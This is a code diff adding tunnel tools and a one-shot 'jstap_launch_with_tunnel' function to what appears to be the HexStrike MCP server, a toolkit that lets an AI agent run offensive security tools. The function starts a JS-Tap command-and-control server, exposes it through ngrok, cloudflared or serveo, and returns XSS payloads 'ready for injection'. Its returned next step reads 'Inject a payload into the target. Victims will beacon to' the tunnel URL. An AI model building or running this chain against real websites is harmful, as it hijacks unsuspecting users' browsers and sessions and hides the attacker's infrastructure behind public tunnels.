@@ -5557,6 +5557,226 @@ def setup_mcp_server(hexstrike_client: HexStrikeClient) -> FastMCP:
             )
         return result
 
+    # =========================================================================
+    # TUNNEL TOOLS
+    # =========================================================================
+
+    @mcp.tool()
+    def tunnel_start(
+        local_port: int = 8444,
+        provider: str = "auto",
+        auth_token: str = "",
+        region: str = "",
+    ) -> Dict[str, Any]:
+        """
+        Start a tunnel to expose a local port to the internet.
+
+        Supported providers (auto-detected if not specified):
+          - ngrok         — requires install; free tier gives random subdomain
+          - cloudflared   — requires install; always free, no account needed
+          - serveo        — SSH-based, no install, may be unreliable
+          - localhost.run — SSH-based, no install
+
+        Args:
+            local_port: Local port to expose (default: 8444, matches JS-Tap default)
+            provider:   'auto', 'ngrok', 'cloudflared', 'serveo', or 'localhost.run'
+            auth_token: ngrok auth token for stable subdomains (optional)
+            region:     ngrok region code e.g. 'us', 'eu', 'ap' (optional)
+
+        Returns:
+            public_url, provider, PID, log path
+        """
+        data: Dict[str, Any] = {
+            "local_port": local_port,
+            "provider": provider,
+        }
+        if auth_token:
+            data["auth_token"] = auth_token
+        if region:
+            data["region"] = region
+
+        logger.info(
+            f"{HexStrikeColors.NEON_BLUE}🌐 Starting {provider} tunnel → "
+            f"localhost:{local_port}{HexStrikeColors.RESET}"
+        )
+        result = hexstrike_client.safe_post("api/tools/tunnel/start", data)
+
+        if result.get("success"):
+            logger.info(
+                f"{HexStrikeColors.SUCCESS}✅ Tunnel up [{result.get('provider')}]: "
+                f"{result.get('public_url')}{HexStrikeColors.RESET}"
+            )
+        else:
+            logger.error(
+                f"{HexStrikeColors.ERROR}❌ Tunnel failed: {result.get('error')}{HexStrikeColors.RESET}"
+            )
+        return result
+
+    @mcp.tool()
+    def tunnel_stop() -> Dict[str, Any]:
+        """
+        Stop the running tunnel.
+
+        Returns:
+            Confirmation with stopped PID
+        """
+        logger.info(
+            f"{HexStrikeColors.CRIMSON}🛑 Stopping tunnel{HexStrikeColors.RESET}"
+        )
+        result = hexstrike_client.safe_post("api/tools/tunnel/stop", {})
+        if result.get("success"):
+            logger.info(
+                f"{HexStrikeColors.SUCCESS}✅ {result.get('message')}{HexStrikeColors.RESET}"
+            )
+        else:
+            logger.error(
+                f"{HexStrikeColors.ERROR}❌ {result.get('error')}{HexStrikeColors.RESET}"
+            )
+        return result
+
+    @mcp.tool()
+    def tunnel_status() -> Dict[str, Any]:
+        """
+        Check whether a tunnel is running and retrieve its public URL.
+
+        Returns:
+            Running status, provider, public_url, local_port, uptime
+        """
+        logger.info(
+            f"{HexStrikeColors.NEON_BLUE}📡 Checking tunnel status{HexStrikeColors.RESET}"
+        )
+        result = hexstrike_client.safe_get("api/tools/tunnel/status")
+
+        if result.get("running"):
+            logger.info(
+                f"{HexStrikeColors.SUCCESS}✅ Tunnel running [{result.get('provider')}] "
+                f"| {result.get('public_url')} | uptime {result.get('uptime')}"
+                f"{HexStrikeColors.RESET}"
+            )
+        else:
+            logger.info(
+                f"{HexStrikeColors.WARNING}⚠️  No tunnel running{HexStrikeColors.RESET}"
+            )
+        return result
+
+    @mcp.tool()
+    def jstap_launch_with_tunnel(
+        port: int = 8444,
+        provider: str = "auto",
+        auth_token: str = "",
+        payload_mode: str = "trap",
+    ) -> Dict[str, Any]:
+        """
+        One-shot: start JS-Tap C2 + tunnel and return internet-ready payloads.
+
+        This convenience tool chains three operations automatically:
+          1. Start JS-Tap in HTTP mode on the specified port
+          2. Start a tunnel (auto-detects ngrok/cloudflared/serveo) pointing at that port
+          3. Generate payload snippets using the tunnel's public HTTPS URL
+
+        The result contains ready-to-inject XSS payloads that route victims
+        through the tunnel to the local JS-Tap C2.
+
+        Args:
+            port:         Local port for JS-Tap (default: 8444)
+            provider:     Tunnel provider — 'auto', 'ngrok', 'cloudflared',
+                          'serveo', or 'localhost.run'
+            auth_token:   ngrok auth token for persistent subdomains (optional)
+            payload_mode: 'trap' (XSS + iframe persistence) or
+                          'implant' (embed in app JS files)
+
+        Returns:
+            Combined result with jstap status, tunnel public_url, and
+            payload variants ready for injection
+        """
+        logger.info(
+            f"{HexStrikeColors.HACKER_RED}🚀 Launching JS-Tap + {provider} tunnel "
+            f"on port {port}{HexStrikeColors.RESET}"
+        )
+
+        # Step 1 — Start JS-Tap in HTTP (Python fallback) mode so the tunnel
+        # can handle TLS termination cleanly
+        jstap_result = hexstrike_client.safe_post(
+            "api/tools/jstap/start",
+            {"port": port, "use_gunicorn": False},
+        )
+        if not jstap_result.get("success"):
+            # Already running is acceptable — continue
+            if "already running" not in jstap_result.get("error", ""):
+                logger.error(
+                    f"{HexStrikeColors.ERROR}❌ JS-Tap start failed: "
+                    f"{jstap_result.get('error')}{HexStrikeColors.RESET}"
+                )
+                return {
+                    "success": False,
+                    "stage": "jstap_start",
+                    "jstap": jstap_result,
+                }
+        logger.info(
+            f"{HexStrikeColors.SUCCESS}✅ JS-Tap running on port {port}{HexStrikeColors.RESET}"
+        )
+
+        # Step 2 — Start the tunnel
+        tunnel_data: Dict[str, Any] = {
+            "local_port": port,
+            "provider": provider,
+        }
+        if auth_token:
+            tunnel_data["auth_token"] = auth_token
+
+        tunnel_result = hexstrike_client.safe_post(
+            "api/tools/tunnel/start", tunnel_data
+        )
+        if not tunnel_result.get("success"):
+            logger.error(
+                f"{HexStrikeColors.ERROR}❌ Tunnel failed: "
+                f"{tunnel_result.get('error')}{HexStrikeColors.RESET}"
+            )
+            return {
+                "success": False,
+                "stage": "tunnel_start",
+                "jstap": jstap_result,
+                "tunnel": tunnel_result,
+            }
+
+        public_url = tunnel_result.get("public_url", "")
+        logger.info(
+            f"{HexStrikeColors.SUCCESS}✅ Tunnel up [{tunnel_result.get('provider')}]: "
+            f"{public_url}{HexStrikeColors.RESET}"
+        )
+
+        # Step 3 — Generate payloads using the public URL
+        payload_result = hexstrike_client.safe_post(
+            "api/tools/jstap/payload",
+            {"server_url": public_url, "mode": payload_mode},
+        )
+        if payload_result.get("success"):
+            variants = list(payload_result.get("payloads", {}).keys())
+            logger.info(
+                f"{HexStrikeColors.SUCCESS}✅ {len(variants)} payload variants ready "
+                f"({', '.join(variants)}){HexStrikeColors.RESET}"
+            )
+        else:
+            logger.warning(
+                f"{HexStrikeColors.WARNING}⚠️  Payload generation issue: "
+                f"{payload_result.get('error')}{HexStrikeColors.RESET}"
+            )
+
+        return {
+            "success": True,
+            "public_url": public_url,
+            "provider": tunnel_result.get("provider"),
+            "payload_mode": payload_mode,
+            "payloads": payload_result.get("payloads", {}),
+            "telemlib_url": payload_result.get("telemlib_url", ""),
+            "jstap": jstap_result,
+            "tunnel": tunnel_result,
+            "next_steps": (
+                f"Inject a payload into the target. Victims will beacon to {public_url}. "
+                f"Monitor sessions at the JS-Tap portal (run jstap_server_status for URL)."
+            ),
+        }
+
     return mcp
 
 def parse_args():
